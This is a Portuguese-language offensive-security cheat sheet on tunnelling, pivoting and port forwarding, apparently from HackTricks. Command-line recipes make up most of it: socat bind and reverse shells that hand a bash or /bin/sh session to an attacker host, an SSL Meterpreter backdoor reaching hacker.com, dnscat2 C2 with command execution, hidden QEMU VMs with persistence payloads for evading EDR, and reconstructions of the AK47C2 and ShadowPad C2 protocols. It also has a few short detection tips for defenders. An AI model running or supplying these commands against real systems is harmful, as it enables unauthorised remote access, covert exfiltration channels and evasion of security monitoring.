# Tunelamento e Port Forwarding

{{#include ../banners/hacktricks-training.md}}

## Dica do Nmap

> [!WARNING]
> **ICMP** e **SYN** scans não podem ser tunelados através de socks proxies, portanto devemos **desabilitar a descoberta por ping** (`-Pn`) e especificar **TCP scans** (`-sT`) para que isso funcione.

## **Bash**

**Host -> Jump -> InternalA -> InternalB**
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Conexão gráfica SSH (X)
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Local Port2Port

Abrir nova porta no servidor SSH --> Outra porta
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Porta local --> Host comprometido (SSH) --> Third_box:Porta
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Porta local --> Host comprometido (SSH) --> Qualquer lugar
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Isso é útil para obter reverse shells de hosts internos por meio de uma DMZ até o seu host:
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Você precisa de **root em ambos os dispositivos** (pois vai criar novas interfaces), e a configuração do sshd deve permitir o login do root:\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Ative o encaminhamento no lado do servidor
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Defina uma nova rota no lado do cliente
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Security – Terrapin Attack (CVE-2023-48795)**
> O ataque de downgrade Terrapin de 2023 pode permitir que um man-in-the-middle adultere o handshake inicial do SSH e injete dados em **qualquer canal encaminhado** ( `-L`, `-R`, `-D` ). Certifique-se de que o cliente e o servidor estejam atualizados (**OpenSSH ≥ 9.6/LibreSSH 6.7**) ou desative explicitamente os algoritmos vulneráveis `chacha20-poly1305@openssh.com` e `*-etm@openssh.com` em `sshd_config`/`ssh_config` antes de depender de túneis SSH.

## SSHUTTLE

Você pode criar um **túnel** via **ssh** para todo o **tráfego** destinado a uma **sub-rede** através de um host.\
Por exemplo, encaminhando todo o tráfego destinado a 10.10.10.0/24
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Conectar com uma chave privada
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

### Port2Port

Porta local --> Host comprometido (sessão ativa) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Outra forma:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

### SOCKS proxy

Abra uma porta no teamserver escutando em todas as interfaces que podem ser usadas para **rotear o tráfego através do beacon**.
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Neste caso, a **porta é aberta no host do beacon**, não no Team Server, e o tráfego é enviado ao Team Server e, de lá, para o host:porta indicado
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Para observar:

- O reverse port forward do Beacon foi projetado para **encaminhar tráfego para o Team Server, não para retransmitir tráfego entre máquinas individuais**.
- O tráfego é **encapsulado no tráfego C2 do Beacon**, incluindo links P2P.
- **Privilégios de administrador não são necessários** para criar reverse port forwards em portas altas.

### rPort2Port local

> [!WARNING]
> Nesse caso, a **porta é aberta no host do Beacon**, não no Team Server, e o **tráfego é enviado para o cliente do Cobalt Strike** (não para o Team Server) e, de lá, para o host:porta indicado
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Você precisa fazer upload de um web file tunnel: ashx|aspx|js|jsp|php|php|jsp.
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Você pode baixá-lo na página de releases de [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
É necessário usar a **mesma versão no client e no server**

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

**Use a mesma versão para o agent e o proxy**

### Tunelamento
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Vinculação e escuta do agente
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Acessar as portas locais do Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Túnel reverso. O túnel é iniciado pela vítima.\
Um proxy socks4 é criado em 127.0.0.1:1080
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot através de **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port através de socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter através de SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Você pode contornar um **proxy sem autenticação** executando esta linha em vez da última no console da vítima:
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Crie certificados em ambos os lados: Client e Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Conecte a porta SSH local (22) à porta 443 do host do atacante
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

É como uma versão de console do PuTTY (as opções são muito semelhantes às de um cliente ssh).

Como esse binário será executado na vítima e é um cliente ssh, precisamos abrir nosso serviço e nossa porta ssh para que possamos obter uma conexão reversa. Então, para encaminhar uma porta acessível apenas localmente para uma porta em nossa máquina:
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-p <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-p 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Você precisa ser um administrador local (para qualquer porta)
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP e Proxifier

Você precisa ter **acesso RDP ao sistema**.\
Baixe:

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Esta ferramenta usa `Dynamic Virtual Channels` (`DVC`) do recurso Remote Desktop Service do Windows. O DVC é responsável por **encapsular pacotes pela conexão RDP**.
2. [Proxifier Portable Binary](https://www.proxifier.com/download/#win-tab)

No computador cliente, carregue **`SocksOverRDP-Plugin.dll`** desta forma:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Agora podemos **nos conectar** à **vítima** via **RDP** usando **`mstsc.exe`**, e devemos receber um **prompt** informando que o **SocksOverRDP plugin está habilitado** e que ele ficará **escutando** em **127.0.0.1:1080**.

**Conecte-se** via **RDP** e faça upload e execute na máquina da vítima o binário `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Agora, confirme em sua máquina (atacante) que a porta 1080 está escutando:
```
netstat -antb | findstr 1080
```
Agora você pode usar o [**Proxifier**](https://www.proxifier.com/) **para enviar o tráfego por esse port.**

## Proxificar aplicativos GUI do Windows

Você pode fazer com que aplicativos GUI do Windows naveguem por um proxy usando o [**Proxifier**](https://www.proxifier.com/).\
Em **Profile -> Proxy Servers**, adicione o IP e a porta do servidor SOCKS.\
Em **Profile -> Proxification Rules**, adicione o nome do programa a ser proxificado e as conexões aos IPs que você deseja proxificar.

## Bypass de proxy NTLM

A ferramenta mencionada anteriormente: **Rpivot**\
O **OpenVPN** também pode fazer bypass disso, definindo estas opções no arquivo de configuração:
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Ele se autentica em um proxy e associa localmente uma porta que é encaminhada para o serviço externo especificado. Então, você pode usar a ferramenta de sua escolha por meio dessa porta.\
Por exemplo, encaminhar a porta 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Agora, se você configurar, por exemplo, o serviço **SSH** na vítima para escutar na porta 443, poderá se conectar a ele através da porta 2222 do atacante.\
Você também poderia usar um **meterpreter** que se conecta a localhost:443, enquanto o atacante está escutando na porta 2222.

## YARP

Um reverse proxy criado pela Microsoft. Você pode encontrá-lo aqui: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy)

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

É necessário ter root em ambos os sistemas para criar adaptadores tun e encapsular dados entre eles usando consultas DNS.
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
O túnel será muito lento. Você pode criar uma conexão SSH comprimida através deste túnel usando:
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Baixe-o aqui**](https://github.com/iagox86/dnscat2)**.**

Estabelece um canal de C\&C por meio de DNS. Não precisa de privilégios de root.
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **No PowerShell**

Você pode usar [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) para executar um cliente dnscat2 no powershell:
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding com dnscat**
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Alterar o DNS do proxychains

Proxychains intercepta a chamada `gethostbyname` da libc e encapsula a solicitação DNS TCP por meio do proxy socks. Por **padrão**, o servidor **DNS** usado pelo proxychains é **4.2.2.2** (codificado diretamente). Para alterá-lo, edite o arquivo: _/usr/lib/proxychains3/proxyresolv_ e altere o IP. Se você estiver em um **ambiente Windows**, poderá definir o IP do **domain controller**.

## Túneis em Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

O ator Storm-2603 criou um **C2 de canal duplo ("AK47C2")** que abusa **somente** do tráfego **DNS** e **HTTP POST simples** de saída — dois protocolos que raramente são bloqueados em redes corporativas.<sup>[[2]](#references)</sup>

1. **Modo DNS (AK47DNS)**
• Gera um SessionID aleatório de 5 caracteres (por exemplo, `H4T14`).
• Adiciona `1` para *solicitações de tarefas* ou `2` para *resultados* e concatena diferentes campos (flags, SessionID, nome do computador).
• Cada campo é **criptografado com XOR usando a chave ASCII `VHBD@H`**, codificado em hexadecimal e unido com pontos — terminando, por fim, com o domínio controlado pelo atacante:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• As solicitações usam `DnsQuery()` para registros **TXT** (e registros **MG** como fallback).
• Quando a resposta excede 0xFF bytes, o backdoor **fragmenta** os dados em partes de 63 bytes e insere os marcadores:
`s<SessionID>t<TOTAL>p<POS>` para que o servidor C2 possa reordená-las.

2. **Modo HTTP (AK47HTTP)**
• Cria um envelope JSON:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Todo o blob é convertido com XOR usando `VHBD@H` → hexadecimal → enviado no corpo de um **`POST /`** com o cabeçalho `Content-Type: text/plain`.
• A resposta segue a mesma codificação, e o campo `cmd` é executado com `cmd.exe /c <command> 2>&1`.

Notas de Blue Team
• Procure **consultas TXT** incomuns cujo primeiro label seja um hexadecimal longo e que sempre terminem em um domínio raro.
• Uma chave XOR constante seguida de ASCII-hex é fácil de detectar com YARA: `6?56484244?484` (`VHBD@H` em hexadecimal).
• Para HTTP, sinalize corpos de requisições POST `text/plain` que sejam compostos apenas por hexadecimais e tenham um número par de bytes.

{{#note}}
Todo o canal cabe em **consultas compatíveis com o padrão RFC** e mantém cada label de subdomínio abaixo de 63 bytes, tornando-o furtivo na maioria dos logs de DNS.
{{#endnote}}

## Tunneling ICMP

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

É necessário ter Root em ambos os sistemas para criar adaptadores tun e encapsular dados entre eles usando solicitações de echo ICMP.
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Baixe-o aqui**](https://github.com/utoni/ptunnel-ng.git).
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

[**ngrok**](https://ngrok.com/) **é uma ferramenta para expor soluções à Internet com uma única linha de comando.**\
_Os URIs de exposição são como:_ **UID.ngrok.io**

### Instalação

- Crie uma conta: https://ngrok.com/signup
- Download do cliente:
```bash
tar xvzf ~/Downloads/ngrok-v3-stable-linux-amd64.tgz -C /usr/local/bin
chmod a+x ./ngrok
# Init configuration, with your token
./ngrok config edit
```
### Usos básicos

**Documentação:** [https://ngrok.com/docs/getting-started/](https://ngrok.com/docs/getting-started/).

_Também é possível adicionar autenticação e TLS, se necessário._

#### Tunelamento TCP
```bash
# Pointing to 0.0.0.0:4444
./ngrok tcp 4444
# Example of resulting link: 0.tcp.ngrok.io:12345
# Listen (example): nc -nvlp 4444
# Remote connect (example): nc $(dig +short 0.tcp.ngrok.io) 12345
```
#### Expondo arquivos com HTTP
```bash
./ngrok http file:///tmp/httpbin/
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
```
#### Sniffing de chamadas HTTP

_Útil para XSS,SSRF,SSTI ..._\
Diretamente do stdout ou na interface HTTP [http://127.0.0.1:4040](http://127.0.0.1:4000).

#### Tunneling de serviço HTTP interno
```bash
./ngrok http localhost:8080 --host-header=rewrite
# Example of resulting link: https://abcd-1-2-3-4.ngrok.io/
# With basic auth
./ngrok http localhost:8080 --host-header=rewrite --auth="myuser:mysuperpassword"
```
#### Exemplo de configuração simples do ngrok.yaml

Ele abre 3 túneis:

- 2 TCP
- 1 HTTP com exposição de arquivos estáticos de /tmp/httpbin/
```yaml
tunnels:
mytcp:
addr: 4444
proto: tcptunne
anothertcp:
addr: 5555
proto: tcp
httpstatic:
proto: http
addr: file:///tmp/httpbin/
```
## Cloudflared (Cloudflare Tunnel)

O daemon `cloudflared` da Cloudflare pode criar túneis de saída que expõem **serviços TCP/UDP locais** sem exigir regras de firewall de entrada, usando a edge da Cloudflare como ponto de encontro. Isso é muito útil quando o firewall de saída permite apenas tráfego HTTPS, mas as conexões de entrada são bloqueadas.

### One-liner de Quick tunnel
```bash
# Expose a local web service listening on 8080
cloudflared tunnel --url http://localhost:8080
# => Generates https://<random>.trycloudflare.com that forwards to 127.0.0.1:8080
```
### SOCKS5 pivot
```bash
# Turn the tunnel into a SOCKS5 proxy on port 1080
cloudflared tunnel --url socks5://localhost:1080 --socks5
# Now configure proxychains to use 127.0.0.1:1080
```
### Túneis persistentes com DNS
```bash
cloudflared tunnel create mytunnel
cloudflared tunnel route dns mytunnel internal.example.com
# config.yml
Tunnel: <TUNNEL-UUID>
credentials-file: /root/.cloudflared/<TUNNEL-UUID>.json
url: http://127.0.0.1:8000
```
Inicie o conector:
```bash
cloudflared tunnel run mytunnel
```
Como todo o tráfego sai do host **para fora pela porta 443**, os túneis do Cloudflared são uma forma simples de contornar ACLs de entrada ou limites de NAT. Esteja ciente de que o binário geralmente é executado com privilégios elevados – use containers ou a flag `--user` quando possível.

## FRP (Fast Reverse Proxy)

[`frp`](https://github.com/fatedier/frp) é um reverse-proxy em Go mantido ativamente que oferece suporte a **TCP, UDP, HTTP/S, SOCKS e perfuração de NAT P2P**. A partir da **v0.53.0 (maio de 2024)**, ele pode atuar como um **SSH Tunnel Gateway**, permitindo que um host-alvo estabeleça um túnel reverso usando apenas o cliente OpenSSH padrão – sem necessidade de um binário adicional.

### Túnel TCP reverso clássico
```bash
# Attacker / server
./frps -c frps.toml            # listens on 0.0.0.0:7000

# Victim
./frpc -c frpc.toml            # will expose 127.0.0.1:3389 on frps:5000

# frpc.toml
serverAddr = "attacker_ip"
serverPort = 7000

[[proxies]]
name       = "rdp"
type       = "tcp"
localIP    = "127.0.0.1"
localPort  = 3389
remotePort = 5000
```
### Usando o novo gateway SSH (sem o binário frpc)
```bash
# On frps (attacker)
sshTunnelGateway.bindPort = 2200   # add to frps.toml
./frps -c frps.toml

# On victim (OpenSSH client only)
ssh -R :80:127.0.0.1:8080 v0@attacker_ip -p 2200 tcp --proxy_name web --remote_port 9000
```
O comando acima publica a porta **8080** da vítima como **attacker_ip:9000** sem implantar ferramentas adicionais — ideal para pivoting living-off-the-land.

## Tunnels discretos baseados em VM com QEMU

A rede em modo de usuário do QEMU (`-netdev user`) oferece uma opção chamada `hostfwd` que **vincula uma porta TCP/UDP no *host* e a encaminha para o *guest***. Quando o guest executa um daemon SSH completo, a regra hostfwd fornece um jump box SSH descartável que reside inteiramente dentro de uma VM efêmera — perfeito para ocultar o tráfego de C2 do EDR, pois toda a atividade e os arquivos maliciosos permanecem no disco virtual.<sup>[[1]](#references)</sup>

### One-liner rápido
```powershell
# Windows victim (no admin rights, no driver install – portable binaries only)
qemu-system-x86_64.exe ^
-m 256M ^
-drive file=tc.qcow2,if=ide ^
-netdev user,id=n0,hostfwd=tcp::2222-:22 ^
-device e1000,netdev=n0 ^
-nographic
```
• O comando acima inicia uma imagem **Tiny Core Linux** (`tc.qcow2`) na RAM.
• A porta **2222/tcp** no host Windows é encaminhada transparentemente para **22/tcp** dentro do guest.
• Do ponto de vista do atacante, o alvo simplesmente expõe a porta 2222; quaisquer pacotes que a alcancem são processados pelo servidor SSH em execução na VM.

### Iniciando furtivamente por meio de VBScript
```vb
' update.vbs – lived in C:\ProgramData\update
Set o = CreateObject("Wscript.Shell")
o.Run "stl.exe -m 256M -drive file=tc.qcow2,if=ide -netdev user,id=n0,hostfwd=tcp::2222-:22", 0
```
Executar o script com `cscript.exe //B update.vbs` mantém a janela oculta.

### Persistência dentro do guest

Como o Tiny Core é stateless, os atacantes geralmente:

1. Salvam o payload em `/opt/123.out`
2. Anexam ao `/opt/bootlocal.sh`:

```sh
while ! ping -c1 45.77.4.101; do sleep 2; done
/opt/123.out
```

3. Adicionam `home/tc` e `opt` a `/opt/filetool.lst` para que o payload seja empacotado em `mydata.tgz` durante o desligamento.

### Por que isso evita a detecção

• Apenas dois executáveis não assinados (`qemu-system-*.exe`) gravam no disco; nenhum driver ou serviço é instalado.
• Os produtos de segurança no host veem **tráfego de loopback benigno** (o C2 real termina dentro da VM).
• Os scanners de memória nunca analisam o espaço de processo malicioso porque ele reside em um sistema operacional diferente.

### Dicas para defensores

• Gere alertas para **binários QEMU/VirtualBox/KVM inesperados** em caminhos graváveis pelo usuário.
• Bloqueie conexões de saída originadas de `qemu-system*.exe`.
• Procure portas de escuta raras (2222, 10022, …) vinculadas imediatamente após a inicialização do QEMU.

## Nós relay IIS/HTTP.sys via `HttpAddUrl` (ShadowPad)

O módulo IIS do ShadowPad, do Ink Dragon, transforma cada servidor web de perímetro comprometido em um **backdoor + relay** ao vincular prefixos de URL ocultos diretamente na camada HTTP.sys:<sup>[[3]](#references)</sup>

* **Padrões de configuração** – se o arquivo de configuração JSON do módulo omitir valores, ele usará padrões plausíveis do IIS (`Server: Microsoft-IIS/10.0`, `DocumentRoot: C:\inetpub\wwwroot`, `ErrorPage: C:\inetpub\custerr\en-US\404.htm`). Dessa forma, o tráfego benigno é respondido pelo IIS com a identificação correta.
* **Interceptação de curingas** – os operadores fornecem uma lista de prefixos de URL separados por ponto e vírgula (curingas no host + caminho). O módulo chama `HttpAddUrl` para cada entrada, fazendo com que o HTTP.sys encaminhe as requisições correspondentes ao handler malicioso *antes* que a requisição alcance os módulos do IIS.
* **Primeiro pacote criptografado** – os dois primeiros bytes do corpo da requisição contêm a seed de um PRNG customizado de 32 bits. Cada byte subsequente recebe XOR com o keystream gerado antes da análise do protocolo:

```python
def decrypt_first_packet(buf):
seed = buf[0] | (buf[1] << 8)
num = seed & 0xFFFFFFFF
out = bytearray(buf)
for i in range(2, len(out)):
hi = (num >> 16) & 0xFFFF
num = (hi * 0x7093915D - num * 0x6EA30000 + 0x06B0F0E3) & 0xFFFFFFFF
out[i] ^= num & 0xFF
return out
```

* **Orquestração do relay** – o módulo mantém duas listas: “servers” (nós upstream) e “clients” (implants downstream). As entradas são removidas se nenhum heartbeat for recebido em aproximadamente 30 segundos. Quando ambas as listas não estão vazias, ele associa o primeiro server saudável ao primeiro client saudável e simplesmente encaminha os bytes entre seus sockets até que um dos lados feche a conexão.
* **Telemetria de debug** – o logging opcional registra o IP de origem, o IP de destino e o total de bytes encaminhados para cada associação. Os investigadores usaram essas pistas para reconstruir a mesh do ShadowPad que abrangia várias vítimas.

---

## Outras ferramentas para verificar

- [https://github.com/securesocketfunneling/ssf](https://github.com/securesocketfunneling/ssf)
- [https://github.com/z3APA3A/3proxy](https://github.com/z3APA3A/3proxy)

## Referências

- [1] [Hiding in the Shadows: Covert Tunnels via QEMU Virtualization](https://trustedsec.com/blog/hiding-in-the-shadows-covert-tunnels-via-qemu-virtualization)
- [2] [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [3] [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)

{{#include ../banners/hacktricks-training.md}}
